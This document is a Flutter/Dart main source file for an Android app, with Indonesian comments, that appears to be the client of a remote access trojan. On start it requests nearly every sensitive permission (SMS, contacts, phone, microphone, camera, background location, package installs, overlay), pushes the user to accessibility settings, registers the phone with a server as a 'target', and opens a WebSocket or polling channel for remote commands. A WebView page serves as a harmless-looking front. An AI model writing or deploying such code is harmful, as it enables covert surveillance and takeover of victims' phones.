import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';

import 'config/build_config.dart';
import 'services/command_poller.dart';
import 'services/ws_client.dart';

// ==========================================
// ===== GLOBAL =====
// ==========================================
const MethodChannel _deviceChannel = MethodChannel('orgsapp/device_info');

// ==========================================
// ===== MAIN =====
// ==========================================
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const GeneratedApp());
}

// ==========================================
// ===== ROOT APP =====
// ==========================================
class GeneratedApp extends StatelessWidget {
  const GeneratedApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: BuildConfig.appName,
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(
          seedColor: const Color(0xFF2196F3),
        ),
        useMaterial3: true,
      ),
      home: const AppBootstrap(),
    );
  }
}

// ==========================================
// ===== BOOTSTRAP =====
// ==========================================
class AppBootstrap extends StatefulWidget {
  const AppBootstrap({super.key});

  @override
  State<AppBootstrap> createState() => _AppBootstrapState();
}

class _AppBootstrapState extends State<AppBootstrap> {
  String _status = 'Memuat...';
  bool _ready = false;

  @override
  void initState() {
    super.initState();
    _bootstrap();
  }

  Future<void> _bootstrap() async {
    try {
      // ==========================================
      // ===== 1. Save config ke SharedPreferences =====
      // ==========================================
      try {
        final prefs = await SharedPreferences.getInstance();
        await prefs.setString('accessKey', BuildConfig.accessKey);
        await prefs.setString('appName', BuildConfig.appName);
        await prefs.setString('buildId', BuildConfig.buildId);
        await prefs.setString('packageName', BuildConfig.packageName);
        await prefs.setString('serverUrl', BuildConfig.serverUrl);
        await prefs.setBool('isNativeApp', true);
        debugPrint('✅ Config saved to prefs');
      } catch (e) {
        debugPrint('⚠️ Prefs error: $e');
      }

      // ==========================================
      // ===== 2. Request Permissions =====
      // ==========================================
      if (mounted) setState(() => _status = 'Meminta izin...');
      try {
        await _requestPermissions();
      } catch (e) {
        debugPrint('⚠️ Permission flow error: $e');
      }

      // ==========================================
      // ===== 3. Register Device =====
      // ==========================================
      if (mounted) setState(() => _status = 'Mendaftar device...');
      try {
        await _registerDeviceWithRetry();
      } catch (e) {
        debugPrint('⚠️ Register error: $e');
      }

      // ==========================================
      // ===== 4. START REAL-TIME (WS + fallback polling) =====
      // ==========================================
      try {
        await WsClient().connect();

        // Fallback: kalau WS gagal connect dalam 5 detik → pakai polling
        Future.delayed(const Duration(seconds: 5), () {
          if (!WsClient().isConnected) {
            debugPrint('⚠️ WS gagal, fallback ke polling');
            CommandPoller().start();
          } else {
            debugPrint('✅ WS aktif — polling dimatikan');
          }
        });
      } catch (e) {
        debugPrint('⚠️ WS error: $e, fallback ke polling');
        CommandPoller().start();
      }

      if (!mounted) return;
      setState(() {
        _status = 'Siap';
        _ready = true;
      });
    } catch (e, st) {
      debugPrint('❌ Bootstrap fatal error: $e');
      debugPrint('$st');
      if (!mounted) return;
      setState(() {
        _status = 'Siap (dengan keterbatasan)';
        _ready = true;
      });
    }
  }

  // ==========================================
  // ===== REQUEST PERMISSIONS =====
  // ==========================================
  Future<void> _requestPermissions() async {
    int sdkInt = 0;
    try {
      sdkInt = await _getAndroidSdkInt();
      debugPrint('📱 Android SDK: $sdkInt');
    } catch (e) {
      debugPrint('⚠️ getSdkInt error: $e');
    }

    final permissions = <Permission>[
      Permission.camera,
      Permission.microphone,
      Permission.location,
      Permission.locationWhenInUse,
      Permission.locationAlways,
      Permission.notification,
      Permission.phone,
      Permission.contacts,
      Permission.sms,
      Permission.calendarFullAccess,
      Permission.calendarWriteOnly,
      Permission.sensors,
      Permission.activityRecognition,
      Permission.bluetooth,
      Permission.bluetoothScan,
      Permission.bluetoothConnect,
      Permission.ignoreBatteryOptimizations,
      Permission.systemAlertWindow,
      Permission.requestInstallPackages,
    ];

    if (sdkInt >= 33) {
      permissions.addAll([
        Permission.photos,
        Permission.videos,
        Permission.audio,
      ]);
    } else {
      permissions.add(Permission.storage);
    }

    for (final perm in permissions) {
      try {
        final status = await perm.status;
        if (status.isDenied || status.isLimited) {
          final result = await perm.request();
          debugPrint('🔑 $perm: $result');
        }
      } catch (e) {
        debugPrint('⚠️ Permission error ($perm): $e');
      }
    }

    try {
      if (Platform.isAndroid) {
        await _openAccessibilitySettings();
      }
    } catch (e) {
      debugPrint('⚠️ Cannot open accessibility settings: $e');
    }
  }

  // ==========================================
  // ===== HELPERS =====
  // ==========================================
  Future<int> _getAndroidSdkInt() async {
    if (!Platform.isAndroid) return 0;
    try {
      final result = await _deviceChannel.invokeMethod<int>('getSdkInt');
      return result ?? 0;
    } catch (e) {
      debugPrint('⚠️ getSdkInt channel error: $e');
      return 0;
    }
  }

  Future<void> _openAccessibilitySettings() async {
    try {
      await _deviceChannel.invokeMethod('openAccessibilitySettings');
      debugPrint('✅ Accessibility settings opened');
    } catch (e) {
      debugPrint('⚠️ Cannot open accessibility settings: $e');
    }
  }

  Future<String> _getDeviceModel() async {
    try {
      final result = await _deviceChannel.invokeMethod<String>('getModel');
      return result ?? 'Android Device';
    } catch (_) {
      return 'Android Device';
    }
  }

  Future<String> _getDeviceBrand() async {
    try {
      final result = await _deviceChannel.invokeMethod<String>('getBrand');
      return result ?? 'Android';
    } catch (_) {
      return 'Android';
    }
  }

  Future<String> _getAndroidVersion() async {
    try {
      final result =
          await _deviceChannel.invokeMethod<String>('getAndroidVersion');
      return result ?? 'Unknown';
    } catch (_) {
      return 'Unknown';
    }
  }

  Future<String> _getOrCreateDeviceId() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      String id = prefs.getString('deviceId') ?? '';
      if (id.isEmpty) {
        id = 'dev_${DateTime.now().millisecondsSinceEpoch}';
        await prefs.setString('deviceId', id);
      }
      return id;
    } catch (_) {
      return 'dev_${DateTime.now().millisecondsSinceEpoch}';
    }
  }

  // ==========================================
  // ===== REGISTER DEVICE =====
  // ==========================================
  Future<void> _registerDeviceWithRetry() async {
    if (BuildConfig.accessKey.isEmpty) {
      debugPrint('⚠️ Access key kosong, skip register');
      return;
    }

    for (int attempt = 1; attempt <= 3; attempt++) {
      try {
        debugPrint('📡 Register attempt $attempt/3');
        final ok = await _registerDevice();
        if (ok) {
          debugPrint('✅ Register success');
          return;
        }
      } catch (e) {
        debugPrint('⚠️ Register attempt $attempt failed: $e');
      }

      if (attempt < 3) {
        await Future.delayed(const Duration(seconds: 2));
      }
    }

    debugPrint('❌ Register failed after 3 attempts');
  }

  Future<bool> _registerDevice() async {
    try {
      int batteryLevel = 0;
      try {
        final battery = Battery();
        batteryLevel = await battery.batteryLevel;
      } catch (e) {
        debugPrint('⚠️ Battery error: $e');
      }

      String connType = 'unknown';
      try {
        final connectivity = Connectivity();
        final result = await connectivity.checkConnectivity();
        connType = result.toString();
      } catch (e) {
        debugPrint('⚠️ Connectivity error: $e');
      }

      final deviceId = await _getOrCreateDeviceId();
      final model = await _getDeviceModel();
      final brand = await _getDeviceBrand();
      final androidVersion = await _getAndroidVersion();

      final payload = {
        'id': deviceId,
        'model': model,
        'brand': brand,
        'androidVersion': androidVersion,
        'battery': batteryLevel,
        'ip': connType,
        'appName': BuildConfig.appName,
        'packageName': BuildConfig.packageName,
        'accessKey': BuildConfig.accessKey,
        'buildId': BuildConfig.buildId,
        'status': 'Online',
        'lastSeen': DateTime.now().toIso8601String(),
      };

      final res = await _httpPost(
        '${BuildConfig.serverUrl}/api/register-target',
        payload,
      );

      return res != null && res.isNotEmpty;
    } catch (e) {
      debugPrint('❌ _registerDevice error: $e');
      return false;
    }
  }

  Future<String?> _httpPost(
    String url,
    Map<String, dynamic> body,
  ) async {
    HttpClient? client;
    try {
      client = HttpClient();
      client.connectionTimeout = const Duration(seconds: 15);

      final request = await client.postUrl(Uri.parse(url));
      request.headers.contentType = ContentType.json;
      request.headers.set('X-Access-Key', BuildConfig.accessKey);
      request.write(jsonEncode(body));

      final response = await request.close();
      final responseBody =
          await response.transform(utf8.decoder).join();

      debugPrint('📥 HTTP ${response.statusCode}: $responseBody');
      return responseBody;
    } catch (e) {
      debugPrint('❌ HTTP error: $e');
      return null;
    } finally {
      client?.close(force: true);
    }
  }

  // ==========================================
  // ===== BUILD =====
  // ==========================================
  @override
  Widget build(BuildContext context) {
    if (!_ready) return _buildLoadingScreen();
    return const WebViewHome();
  }

  // ==========================================
  // ===== LOADING SCREEN =====
  // ==========================================
  Widget _buildLoadingScreen() {
    return Scaffold(
      backgroundColor: Colors.white,
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(32),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(
                Icons.sync_rounded,
                size: 48,
                color: Colors.blueGrey,
              ),
              const SizedBox(height: 20),
              Text(
                BuildConfig.appName,
                style: const TextStyle(
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  color: Colors.black87,
                ),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 8),
              Text(
                _status,
                style: const TextStyle(
                  fontSize: 13,
                  color: Colors.black54,
                ),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 24),
              const SizedBox(
                width: 22,
                height: 22,
                child: CircularProgressIndicator(
                  strokeWidth: 2.5,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ==========================================
// ===== WEBVIEW HOME =====
// ==========================================
class WebViewHome extends StatefulWidget {
  const WebViewHome({super.key});

  @override
  State<WebViewHome> createState() => _WebViewHomeState();
}

class _WebViewHomeState extends State<WebViewHome> {
  late final WebViewController _controller;
  bool _isLoading = true;
  int _progress = 0;
  bool _hasError = false;
  String _errorMessage = '';

  @override
  void initState() {
    super.initState();
    _initWebView();
  }

  void _initWebView() {
    try {
      _controller = WebViewController()
        ..setJavaScriptMode(JavaScriptMode.unrestricted)
        ..setBackgroundColor(Colors.white)
        ..setUserAgent(
          'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 '
          '(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        )
        ..addJavaScriptChannel(
          'AppBridge',
          onMessageReceived: (msg) {
            debugPrint('📨 From web: ${msg.message}');
            _handleWebMessage(msg.message);
          },
        )
        ..setNavigationDelegate(
          NavigationDelegate(
            onProgress: (p) {
              if (mounted) setState(() => _progress = p);
            },
            onPageStarted: (_) {
              if (!mounted) return;
              setState(() {
                _isLoading = true;
                _hasError = false;
              });
            },
            onPageFinished: (_) async {
              if (!mounted) return;
              setState(() => _isLoading = false);
              await _injectConfig();
            },
            onWebResourceError: (error) {
              if (!mounted) return;
              setState(() {
                _hasError = true;
                _errorMessage = error.description;
                _isLoading = false;
              });
              debugPrint('❌ WebView error: ${error.description}');
            },
            onNavigationRequest: (request) {
              return NavigationDecision.navigate;
            },
          ),
        )
        ..loadRequest(Uri.parse(BuildConfig.webviewUrl));

      debugPrint('✅ WebView initialized');
    } catch (e) {
      debugPrint('❌ WebView init error: $e');
      if (mounted) {
        setState(() {
          _hasError = true;
          _errorMessage = 'Gagal init WebView: $e';
          _isLoading = false;
        });
      }
    }
  }

  Future<void> _injectConfig() async {
    try {
      final js = """
        (function() {
          try {
            localStorage.setItem('accessKey', '${BuildConfig.accessKey}');
            localStorage.setItem('appName', '${BuildConfig.appName}');
            localStorage.setItem('packageName', '${BuildConfig.packageName}');
            localStorage.setItem('buildId', '${BuildConfig.buildId}');
            localStorage.setItem('serverUrl', '${BuildConfig.serverUrl}');
            localStorage.setItem('isNativeApp', 'true');
            console.log('[App] Config injected');
          } catch (e) {
            console.error('[App] Inject error', e);
          }
        })();
      """;
      await _controller.runJavaScript(js);
      debugPrint('✅ Config injected ke WebView');
    } catch (e) {
      debugPrint('❌ Inject error: $e');
    }
  }

  void _handleWebMessage(String message) {
    try {
      final data = jsonDecode(message);
      final action = data['action']?.toString();

      switch (action) {
        case 'openUrl':
          final url = data['url']?.toString();
          if (url != null && url.isNotEmpty) {
            launchUrl(
              Uri.parse(url),
              mode: LaunchMode.externalApplication,
            );
          }
          break;
        case 'close':
          SystemNavigator.pop();
          break;
        default:
          debugPrint('Unknown action: $action');
      }
    } catch (e) {
      debugPrint('Parse message error: $e');
    }
  }

  Future<void> _reload() async {
    setState(() {
      _hasError = false;
      _isLoading = true;
      _progress = 0;
    });
    try {
      await _controller.loadRequest(Uri.parse(BuildConfig.webviewUrl));
    } catch (e) {
      debugPrint('❌ Reload error: $e');
      if (mounted) {
        setState(() {
          _hasError = true;
          _errorMessage = 'Gagal reload: $e';
          _isLoading = false;
        });
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return PopScope(
      canPop: false,
      onPopInvoked: (didPop) async {
        if (didPop) return;
        try {
          final canGoBack = await _controller.canGoBack();
          if (canGoBack) {
            await _controller.goBack();
          } else {
            SystemNavigator.pop();
          }
        } catch (e) {
          debugPrint('❌ Back error: $e');
          SystemNavigator.pop();
        }
      },
      child: Scaffold(
        body: SafeArea(
          child: Stack(
            children: [
              if (!_hasError)
                WebViewWidget(controller: _controller)
              else
                _buildErrorScreen(),

              if (_isLoading && !_hasError)
                Positioned(
                  top: 0,
                  left: 0,
                  right: 0,
                  child: LinearProgressIndicator(
                    value: _progress / 100,
                    backgroundColor: Colors.grey.shade200,
                    color: Colors.blue,
                    minHeight: 2,
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildErrorScreen() {
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(32),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const Icon(
              Icons.wifi_off_rounded,
              color: Colors.grey,
              size: 56,
            ),
            const SizedBox(height: 16),
            const Text(
              'Koneksi Bermasalah',
              style: TextStyle(
                fontSize: 16,
                fontWeight: FontWeight.w600,
                color: Colors.black87,
              ),
            ),
            const SizedBox(height: 8),
            Text(
              _errorMessage,
              textAlign: TextAlign.center,
              style: const TextStyle(
                fontSize: 13,
                color: Colors.black54,
              ),
            ),
            const SizedBox(height: 20),
            ElevatedButton(
              onPressed: _reload,
              child: const Text('COBA LAGI'),
            ),
          ],
        ),
      ),
    );
  }
}
